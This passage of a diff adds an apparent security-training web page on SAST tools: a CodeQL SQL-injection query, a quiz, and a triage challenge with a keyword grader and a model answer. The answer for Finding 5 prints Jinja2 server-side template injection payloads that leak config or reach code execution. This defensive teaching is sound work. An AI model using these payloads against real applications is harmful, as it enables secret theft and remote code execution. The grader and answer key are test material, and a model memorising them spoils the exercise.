+<div style="font-family:'Inconsolata',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--purple);margin-bottom:.75rem;font-weight:700;">CodeQL — Deep Dive</div>
+<p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;">CodeQL converts your codebase into a relational database where tables represent code elements (functions, classes, variables) and their relationships. You query this database using QL — a declarative query language. A SQL injection query asks: "find all paths from untrusted HTTP input to a database call where no sanitizer exists in between." This is true taint analysis across your entire codebase.</p>
+<pre style="font-size:12.5px;">
+<span class="cm2"># Enable CodeQL in GitHub Actions (free for public repos)</span>
+<span class="cm2"># Add to .github/workflows/codeql.yml:</span>
+
+<span class="cm2"># Example CodeQL QL query — SQL injection (simplified)</span>
+<span class="cf">import</span> python
+<span class="cf">import</span> semmle.python.security.dataflow.SqlInjectionQuery
+
+<span class="cf">from</span> SqlInjection::Configuration config, DataFlow::PathNode source, DataFlow::PathNode sink
+<span class="cf">where</span> config.hasFlowPath(source, sink)
+<span class="cf">select</span> sink.getNode(), source, sink,
+  <span class="cs">"SQL injection from $@"</span>, source.getNode(), <span class="cs">"this user input"</span>
+
+<span class="cm2"># QL features:</span>
+<span class="cm2"># - Full inter-procedural taint analysis (follows data across function calls)</span>
+<span class="cm2"># - Customizable sources, sinks, and sanitizers</span>
+<span class="cm2"># - Results include full path from source to sink</span>
+<span class="cm2"># - Used by GitHub security team to find CVEs in major OSS projects</span>
+</pre>
+</div>`
+  }
+};
+
+function selectTool(name){
+  document.querySelectorAll('.tool-card').forEach(c=>c.classList.remove('selected'));
+  document.getElementById('tc-'+name).classList.add('selected');
+  document.getElementById('tool-detail').innerHTML = toolDetails[name].content;
+  document.getElementById('tool-detail').scrollIntoView({behavior:'smooth',block:'nearest'});
+}
+selectTool('bandit');
+
+// Quiz
+function doQ(qid,el,result){
+  const container=document.getElementById(qid);
+  container.querySelectorAll('.qo').forEach(o=>o.onclick=null);
+  el.classList.add(result==='correct'?'correct':'wrong');
+  document.getElementById(qid+'-exp').classList.add('show');
+}
+
+// Challenge
+function checkCh(){
+  const ans=document.getElementById('ch-ans').value.toLowerCase();
+  const fb=document.getElementById('ch-fb');
+  const checks=[
+    (ans.includes('false') && (ans.includes('finding 1')||ans.includes('1:'))),
+    (ans.includes('finding 2')||ans.includes('2:')) && (ans.includes('true')||ans.includes('sha256')||ans.includes('argon')||ans.includes('password reset')),
+    (ans.includes('finding 3')||ans.includes('3:')) && (ans.includes('false')||ans.includes('test')||ans.includes('mock')),
+    (ans.includes('finding 4')||ans.includes('4:')) && (ans.includes('false')||ans.includes('dedup')||ans.includes('cache')||ans.includes('not.*password')),
+    (ans.includes('finding 5')||ans.includes('5:')) && (ans.includes('true')||ans.includes('ssti')||ans.includes('admin')||ans.includes('template')),
+    ans.includes('rules:') && (ans.includes('pattern') || ans.includes('semgrep')),
+  ];
+  const score=checks.filter(Boolean).length;
+  fb.className='ch-fb show '+(score>=5?'good':score>=3?'hint':'hint');
+  if(score>=5){
+    fb.innerHTML=`🎯 Strong analysis — ${score}/6 correct. You're thinking about SAST triage the right way — context matters more than the raw finding. The hardest one: Finding 1 (FALSE POSITIVE) trips up many engineers because SQL concatenation with <strong>Django's request.user.id</strong> looks dangerous but request.user is set by Django's authenticated session, not the request body. The value is an integer from the DB — not attacker-controlled text.`;
+  } else if(score>=3){
+    fb.innerHTML=`✅ Good work — ${score}/6 correct. Key guidance: <strong>Finding 1</strong> — request.user.id is Django's authenticated user ID (integer from session, not from request body) → FALSE POSITIVE. <strong>Finding 2</strong> — SHA-256 for a password reset token is a TRUE POSITIVE: tokens are secrets and SHA-256 is fast enough to brute-force if leaked. Use secrets.token_urlsafe(32) instead. <strong>Finding 5</strong> — admin-created Jinja2 templates are TRUE POSITIVE: SSTI is still possible if an admin account is compromised.`;
+  } else {
+    fb.innerHTML=`⚠️ Focus on the triage reasoning. For each finding ask: (1) Where does the risky value come from? (2) Is it attacker-controlled or system-controlled? (3) What is the actual impact? Finding 1: request.user.id is set by Django auth from the session — is that attacker-controlled? Finding 3: it's in a test file with a mock key — does it go to production? Think through the attack path.`;
+  }
+}
+
+function revealCh(){
+  const fb=document.getElementById('ch-fb');
+  fb.className='ch-fb show reveal';
+  fb.innerHTML=`<strong>Model Answer:</strong><br><br>
+<strong>Finding 1 — FALSE POSITIVE</strong><br>
+<code>request.user.id</code> is Django's authenticated user object, populated by Django's authentication middleware from the server-side session — not from the request body. It is always an integer set by Django's ORM. An attacker cannot inject arbitrary SQL through this value. However, the code style is still bad practice (string concatenation). Recommended action: migrate to <code>Account.objects.filter(user_id=user_id)</code> (ORM) or <code>cursor.execute("SELECT ... WHERE user_id = %s", [user_id])</code>. Suppression: <code># nosec B608 — user_id is Django session integer, not user-supplied text. Ticket #5821 to refactor to ORM.</code><br><br>
+<strong>Finding 2 — TRUE POSITIVE</strong><br>
+SHA-256 is fast (20 billion hashes/sec on a GPU). A password reset token is a secret value — if the token database is breached, SHA-256 hashes of short random strings can be brute-forced. Fix: don't hash the token at all. Store it directly using <code>token = secrets.token_urlsafe(32)</code> in the DB with an expiry column. The token itself is the credential — it's already high entropy. If you must hash it, use HMAC-SHA256 with a server-side key.<br><br>
+<strong>Finding 3 — FALSE POSITIVE (with caveat)</strong><br>
+The key is a test fixture value explicitly named "test-key-do-not-use-in-prod" and lives only in <code>tests/</code>. It is used against a mock API server in CI — never against production. Suppression: <code># nosec B105 — test fixture key for mock API server only, never used in production.</code> Caveat: ensure <code>tests/</code> is excluded from production deployments and that <code>.semgrepignore</code> excludes test directories to reduce noise.<br><br>
+<strong>Finding 4 — FALSE POSITIVE</strong><br>
+MD5 used as a file deduplication fingerprint is not a security-sensitive use of MD5. It is not used for authentication, passwords, or integrity verification of security-critical data. MD5 collision attacks require an attacker who can craft two files with the same hash — irrelevant for deduplication of user uploads where you control the file storage. Suppression: <code># nosec B324 — MD5 for file deduplication only, not used for authentication or integrity verification.</code><br><br>
+<strong>Finding 5 — TRUE POSITIVE</strong><br>
+Even though only admin users can set the template, Jinja2 templates support Server-Side Template Injection (SSTI): <code>{{ config.items() }}</code> or <code>{{ ''.__class__.__mro__[2].__subclasses__() }}</code> can leak config secrets or achieve RCE. If an admin account is compromised (phishing, credential stuffing), attacker gets SSTI → RCE. Fix: use Jinja2 sandbox: <code>from jinja2.sandbox import SandboxedEnvironment</code>. Or better: don't allow Jinja2 syntax — use a template language without code execution (Mustache, Handlebars).<br><br>
+<strong>Semgrep Rule for Finding 1 (correct version):</strong><br>
+<code>rules:<br>
+&nbsp;&nbsp;- id: sql-string-concatenation<br>
+&nbsp;&nbsp;&nbsp;&nbsp;message: "SQL built with string concatenation. Use parameterized queries."<br>
+&nbsp;&nbsp;&nbsp;&nbsp;severity: ERROR<br>
+&nbsp;&nbsp;&nbsp;&nbsp;languages: [python]<br>
+&nbsp;&nbsp;&nbsp;&nbsp;patterns:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- pattern: $Q = "..." + ...<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- pattern-either:<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- pattern: cursor.execute($Q)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- pattern: db.execute($Q)<br>
+&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;- pattern: conn.execute($Q)</code>`;
+}
+</script>
+</body>
+</html>
